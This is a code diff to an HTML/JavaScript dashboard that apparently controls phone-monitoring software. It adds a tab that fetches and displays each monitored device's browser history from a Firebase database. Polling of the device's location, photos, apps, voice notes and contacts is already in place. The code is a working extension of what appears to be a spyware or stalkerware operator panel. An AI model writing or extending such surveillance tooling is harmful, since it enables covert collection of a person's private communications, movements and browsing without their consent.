@@ -187,6 +187,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
 <button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
 <button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
+<button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -284,6 +285,22 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
   <div style="font-size:13px;font-weight:500;margin-bottom:8px">&#x1F9F9; Cleanup Actions</div>
   <div id="cleanupActions" style="display:flex;flex-direction:column;gap:6px"></div>
 </div>
+</div>
+<div id="tab-browser">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:14px;font-weight:500">&#x1F310; Browser History</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollBrowserHistory()">&#x1F504; Refresh</span>
+</div>
+<div class="filter-chips" id="browserChips" style="margin-bottom:6px">
+  <span class="chip active" data-browser="all">All</span>
+  <span class="chip" data-browser="chrome">Chrome</span>
+  <span class="chip" data-browser="firefox">Firefox</span>
+  <span class="chip" data-browser="samsung">Samsung</span>
+  <span class="chip" data-browser="huawei">Huawei</span>
+  <span class="chip" data-browser="other">Other</span>
+</div>
+<input type="text" id="browserSearch" placeholder="&#x1F50D; Search titles, URLs..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
+<div id="browserList"><div class="label">No browsing history yet</div></div>
 </div>
 <div id="tab-playback">
 <div class="pb-stats" id="pbStats" style="display:none">
@@ -630,6 +647,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'playback') renderPlaybackTab();
     if (btn.dataset.tab === 'insights') renderInsights();
     if (btn.dataset.tab === 'storage') refreshStorage();
+    if (btn.dataset.tab === 'browser') pollBrowserHistory();
   });
 });
 
@@ -667,6 +685,7 @@ function startPolling() {
   schedulePoll('contacts', 60000, pollContacts);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
   schedulePoll('queue', 30000, pollQueueSize);
+  schedulePoll('browser', 120000, pollBrowserHistory);
   schedulePoll('insights', 120000, renderInsights);
 }
 
@@ -679,7 +698,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize()];
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -1986,6 +2005,98 @@ async function execCleanup(action, path) {
     }
     return;
   }
+}
+
+// --- Browser History ---
+let browserFilter = 'all';
+document.querySelectorAll('#browserChips .chip').forEach(chip => {
+  chip.addEventListener('click', function() {
+    document.querySelectorAll('#browserChips .chip').forEach(c => c.classList.remove('active'));
+    this.classList.add('active');
+    browserFilter = this.dataset.browser;
+    const cached = document.getElementById('browserList').cachedData;
+    if (cached) renderBrowserHistory(cached);
+  });
+});
+document.getElementById('browserSearch').addEventListener('input', function() {
+  const cached = document.getElementById('browserList').cachedData;
+  if (cached) renderBrowserHistory(cached);
+});
+
+function browserIcon(provider) {
+  const p = (provider || '').toLowerCase();
+  if (p.includes('chrome')) return '\u{1F310}';
+  if (p.includes('firefox')) return '\u{1F98A}';
+  if (p.includes('samsung') || p.includes('sbrowser')) return '\u{1F4F1}';
+  if (p.includes('huawei')) return '\u{1F30D}';
+  if (p.includes('opera')) return '\u{25CE}';
+  if (p.includes('brave')) return '\u{1F99A}';
+  if (p.includes('edge') || p.includes('emmex')) return '\u{1F310}';
+  return '\u{1F5B1}';
+}
+
+function browserGroup(p) {
+  const prov = (p || '').toLowerCase();
+  if (prov.includes('chrome')) return 'chrome';
+  if (prov.includes('firefox')) return 'firefox';
+  if (prov.includes('samsung') || prov.includes('sbrowser')) return 'samsung';
+  if (prov.includes('huawei')) return 'huawei';
+  return 'other';
+}
+
+function renderBrowserHistory(entries) {
+  const list = document.getElementById('browserList');
+  list.cachedData = entries;
+  let filtered = entries;
+  if (browserFilter !== 'all') filtered = filtered.filter(e => browserGroup(e.provider) === browserFilter);
+  const q = document.getElementById('browserSearch').value.toLowerCase();
+  if (q) filtered = filtered.filter(e => (e.title || '').toLowerCase().includes(q) || (e.url || '').toLowerCase().includes(q));
+  if (!filtered.length) { list.innerHTML = '<div class="label">No entries' + (q ? ' matching "' + q + '"' : '') + '</div>'; return; }
+  const groups = {};
+  for (const e of filtered) {
+    const day = new Date(e.dateMs).toLocaleDateString('en-PK', { timeZone: PKT, day: '2-digit', month: 'short', weekday: 'short' });
+    if (!groups[day]) groups[day] = [];
+    groups[day].push(e);
+  }
+  let html = '';
+  for (const [day, entries] of Object.entries(groups)) {
+    html += `<div class="tl-group"><div class="tl-day">${day} <span style="font-weight:400;color:var(--muted)">(${entries.length})</span></div>`;
+    for (const e of entries) {
+      const icon = browserIcon(e.provider);
+      const title = e.title || '(no title)';
+      const url = e.url ? (e.url.length > 80 ? e.url.slice(0, 80) + '...' : e.url) : '';
+      const visits = e.visits > 1 ? ` \u2022 ${e.visits} visits` : '';
+      const time = e.dateMs ? pktShort(e.dateMs) : '';
+      html += `<div class="card" style="padding:8px 12px;margin-bottom:4px">
+        <div class="time">${icon} ${time}${visits}</div>
+        <div style="font-size:12px;font-weight:500">${escHtml(title)}</div>
+        <div style="font-size:10px;color:var(--muted);word-break:break-all">${escHtml(url)}</div>
+      </div>`;
+    }
+    html += '</div>';
+  }
+  list.innerHTML = html;
+}
+
+async function pollBrowserHistory() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('browserList');
+  list.innerHTML = '<div class="label" style="color:var(--accent)">Loading browsing history...</div>';
+  try {
+    const data = await fetchRTDB(`devices/${selectedDevice}/browser_history`);
+    if (!data || typeof data !== 'object') { list.innerHTML = '<div class="label">No browsing history yet</div>'; return; }
+    const all = [];
+    for (const batch of Object.values(data)) {
+      if (batch && batch.history && Array.isArray(batch.history)) {
+        for (const entry of batch.history) {
+          if (entry && entry.url) all.push(entry);
+        }
+      }
+    }
+    all.sort((a, b) => (b.dateMs || 0) - (a.dateMs || 0));
+    if (!all.length) { list.innerHTML = '<div class="label">No browsing history yet</div>'; return; }
+    renderBrowserHistory(all);
+  } catch { list.innerHTML = '<div class="label" style="color:var(--danger)">Failed to load history</div>'; }
 }
 
 // --- Data Export ---
